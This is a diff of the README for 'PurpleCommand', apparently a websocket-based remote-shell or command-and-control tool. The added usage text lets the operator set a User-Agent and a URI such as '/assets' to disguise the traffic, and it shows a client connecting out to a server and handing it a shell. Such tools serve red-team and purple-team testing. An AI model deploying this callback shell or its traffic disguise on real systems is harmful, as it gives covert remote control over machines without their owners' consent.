@@ -9,24 +9,49 @@ The communication is secure and very malleable. It can be channeled through Cont
 Start the server:
 
 ```
-~$ go run . -l
-2024/01/06 16:38:26 Listening on ws://0.0.0.0:8081/
-2024/01/06 16:38:28 TCP Listener up on 0.0.0.0:8080
+        Server usage: purpcmd server [options] ...
+
+        Client usage: purpcmd client [options] ...
+                -ua defines the User-Agent HTTP header to use
+                during the request.
+
+        Global Options:
+                -a is the address to listen on or connect to.
+                Use "-a 127.0.0.1:8080".
+
+                -uri configures the URI where to connect or to receive
+                the websocket connection.
+                Use "-uri /assets";
+
 ```
 
-Connect with the client:
+### 1. Start the server
 
 ```
-$ go run . -c
-2024/01/06 17:04:36 Connecting to ws://0.0.0.0:8081/
-2024/01/06 17:04:36 + Proxy connected
+go run . server
+2024/02/17 01:08:57 Listening on ws://0.0.0.0:8080/
 ```
 
-Connect to the server using SSH:
+### 2. Execute the client
 
 ```
-$ ssh 0.0.0.0 -p 8080 -i id_ecdsa
-user@go:~/go/src/PurpleCommand$ ls
-go.mod  go.sum  img  main.go  README.md  src
-usero@go:~/go/src/PurpleCommand$
+go run . client -a 0.0.0.0:8080
+2024/02/17 01:10:32 Connecting to ws://0.0.0.0:8080/
+2024/02/17 01:10:32 Key O+XvBDAEHzyN9s78Iy6iegk3vWT7hzQZsErg/2Y+Ehg= found.
+2024/02/17 01:10:32 Client got shell
+```
+
+### 3. Use the server new shell
+
+```
+╰─$ go run . server
+2024/02/17 01:08:57 Listening on ws://0.0.0.0:8080/
+2024/02/17 01:10:32 Proxy connected 0.0.0.0:8080
+Setting up STDIN
+Setting up STDOUT
+Setting up STDERR
+call shell
+farinap@xyz:~/go/src/PurpleCommand$ ls
+LICENSE  README.md  agent  go.mod  go.sum  img  main.go  server  utils
+farinap@xyz:~/go/src/PurpleCommand$
 ```
